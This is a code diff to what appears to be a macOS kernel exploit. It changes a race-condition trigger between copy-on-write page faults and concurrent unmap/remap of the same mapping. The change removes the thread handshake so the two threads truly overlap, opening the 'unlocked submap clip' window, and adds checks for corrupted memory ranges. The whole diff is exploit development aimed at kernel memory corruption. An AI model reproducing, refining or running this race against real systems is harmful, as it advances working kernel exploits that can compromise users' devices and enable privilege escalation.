@@ -25,7 +25,6 @@
 /* ------------------------------------------------------------------ */
 
 static volatile int g_go = 0;
-static volatile int g_round_done = 0;
 static cow_map_t *g_cow = NULL;
 static U64 g_fault_rounds = 0;
 static U64 g_fault_hits = 0;
@@ -51,9 +50,15 @@ static void *fault_thread(void *arg)
 
     U64 stride = g_cow->dst_size / COW_FAULT_PAGES;
 
+    /* Fault continuously. The Bug 1 TOCTOU needs a COW fault IN FLIGHT while
+     * mutate_thread deallocates/remaps the dst entry, so the fault loop must
+     * not be gated by detection. The old g_round_done handshake serialized
+     * fault vs teardown (faults only fired on the already-fresh mapping) and
+     * never raced them at all. */
     while (g_go) {
+        U64 base = g_cow->dst_addr;
         for (U64 i = 0; i < COW_FAULT_PAGES; i++) {
-            volatile unsigned char *p = (unsigned char *)(g_cow->dst_addr + i * stride);
+            volatile unsigned char *p = (unsigned char *)(base + i * stride);
             g_in_fault = 1;
             if (sigsetjmp(g_segv_jmp, 1) == 0) {
                 *p = (unsigned char)(0x41 + (i & 0xf));
@@ -64,8 +69,7 @@ static void *fault_thread(void *arg)
             g_in_fault = 0;
         }
         g_fault_rounds++;
-        while (g_round_done == 0) pthread_yield_np();
-        __sync_synchronize();
+        pthread_yield_np();
     }
     return NULL;
 }
@@ -75,9 +79,11 @@ static void *mutate_thread(void *arg)
     (void)arg;
     while (g_go == 0) pthread_yield_np();
 
-    U64 re_alloc = g_cow->dst_addr;
     while (g_go) {
-        /* free the COW'd dst mapping -> drops the submap refcount */
+        U64 re_alloc = g_cow->dst_addr;
+        /* free the COW'd dst mapping -> drops the submap refcount. Runs
+         * concurrently with fault_thread's in-flight COW fault, which is the
+         * window that opens the unlocked submap clip (Bug 1). */
         mach_vm_deallocate(mach_task_self(), g_cow->dst_addr, g_cow->dst_size);
         nsleep(50 * 1000);
         /* re-create the COW submap mapping at the same address */
@@ -90,15 +96,13 @@ static void *mutate_thread(void *arg)
         if (kr == KERN_SUCCESS) {
             g_cow->dst_addr = re_alloc;
         }
-        __sync_synchronize();
-        g_round_done = 1;
-        while (g_round_done != 0) pthread_yield_np();
     }
     return NULL;
 }
 
 bool cow_map_setup(cow_map_t *m)
 {
+    memset(m, 0, sizeof(*m));
     m->src_size = COW_SRC_PAGES * PAGE_SIZE_;
     m->dst_size = m->src_size;
 
@@ -118,6 +122,8 @@ bool cow_map_setup(cow_map_t *m)
                   &cur, &max, VM_INHERIT_NONE);
     if (kr != KERN_SUCCESS) {
         LOGBAD("vm_remap COW failed: %#x", kr);
+        mach_vm_deallocate(mach_task_self(), m->src_addr, m->src_size);
+        memset(m, 0, sizeof(*m));
         return false;
     }
     LOGOK("COW submap: src %#llx size %#llx, dst %#llx", m->src_addr, m->src_size, m->dst_addr);
@@ -198,12 +204,12 @@ int run_clip_race(cow_map_t *m, U64 *corrupted_start, U64 *corrupted_end)
 
     __sync_synchronize();
     g_go = 1;
-    g_round_done = 0;
 
     int found = 0;
     for (U64 round = 0; round < RACE_ITERATIONS && !found; round++) {
-        while (g_round_done == 0) pthread_yield_np();
-        __sync_synchronize();
+        /* detection cadence only: fault/mutate run continuously and overlap;
+         * this sleep just paces the corruption checks. */
+        nsleep(20 * 1000 * 1000);
 
         if (round % 100 == 0) {
             LOG("race round %llu (fault_hits %llu)", round, g_fault_hits);
@@ -217,9 +223,6 @@ int run_clip_race(cow_map_t *m, U64 *corrupted_start, U64 *corrupted_end)
             found = 1;
             break;
         }
-
-        g_round_done = 0;
-        __sync_synchronize();
     }
 
     g_go = 0;
